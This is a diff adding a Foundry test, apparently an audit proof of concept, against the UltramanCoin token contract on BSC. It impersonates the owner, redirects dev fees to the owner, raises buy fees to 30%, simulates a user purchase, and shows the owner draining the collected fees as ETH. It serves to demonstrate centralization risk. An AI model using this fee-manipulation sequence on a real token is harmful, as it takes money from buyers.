@@ -1,0 +1,120 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Minimal ERC20 interface
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+}
+
+// Minimal Uniswap V2 Router interfaces
+interface IUniswapV2Router01 {
+    function swapExactETHForTokens(
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external payable returns (uint[] memory amounts);
+    function WETH() external pure returns (address);
+}
+
+interface IUniswapV2Router02 is IUniswapV2Router01 {
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+}
+
+// UltramanCoin relevant functions
+interface UltramanCoin is IERC20 {
+    function owner() external view returns (address);
+    function setDevAddress(address payable) external;
+    function setBuyFees(uint8, uint8, uint8, uint8) external;
+    function manualSwapAndAddToLiq() external;
+}
+
+// Chain: BSC
+// Contract: UltramanCoin
+// Address: 0x733f8B3545a810214D2D27EEC8c60f93b561C050
+contract ExploitTest is Test {
+    address constant ULTRA = 0x733f8B3545a810214D2D27EEC8c60f93b561C050;
+    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+
+    UltramanCoin ultra = UltramanCoin(ULTRA);
+    IUniswapV2Router02 router = IUniswapV2Router02(ROUTER);
+
+    function setUp() public {
+        vm.label(ULTRA, "ULTRA");
+        vm.label(ROUTER, "Router");
+        vm.label(WBNB, "WBNB");
+    }
+
+    // Demonstrates that the owner can change fee structure and then
+    // accumulate contract tokens through user buys, then convert them
+    // to ETH and send dev fees to themselves, gaining personal profit.
+    function testOwnerAbusesFeeSettings() public {
+        address owner = ultra.owner();
+        vm.label(owner, "Owner");
+        address user = address(0x420);
+        vm.label(user, "User");
+
+        // Fund participants for gas and trading
+        deal(owner, 100 ether);
+        deal(user, 10 ether);
+
+        uint256 ownerEthBefore = owner.balance;
+
+        // --- Owner abuses privileges ---
+        vm.startPrank(owner);
+        // Set dev address to owner so dev fees will be sent to him
+        ultra.setDevAddress(payable(owner));
+        // Set buy fees: rfi=0, treasury=0, dev=30, lp=0
+        // => toSwap = 30% (all dev) -> every buy sends 30% of tokens to contract
+        ultra.setBuyFees(0, 0, 30, 0);
+        vm.stopPrank();
+
+        // --- User buys tokens via AMM ---
+        vm.startPrank(user);
+        address[] memory path = new address[](2);
+        path[0] = WBNB;    // WBNB
+        path[1] = ULTRA;   // ULTRA
+        // Buy with a small amount to stay within max wallet limit
+        router.swapExactETHForTokens{value: 0.001 ether}(
+            0,           // amountOutMin
+            path,
+            user,
+            block.timestamp
+        );
+        vm.stopPrank();
+
+        uint256 contractTokenBalance = ultra.balanceOf(ULTRA);
+        assertGt(contractTokenBalance, 0, "Contract should have collected token fees");
+
+        // --- Owner converts contract tokens to ETH and receives dev fee ---
+        vm.prank(owner);
+        ultra.manualSwapAndAddToLiq();
+
+        // Owner's ETH balance should have increased due to dev fee payout
+        assertGt(owner.balance, ownerEthBefore, "Owner should have gained ETH from dev fee");
+    }
+}
+```
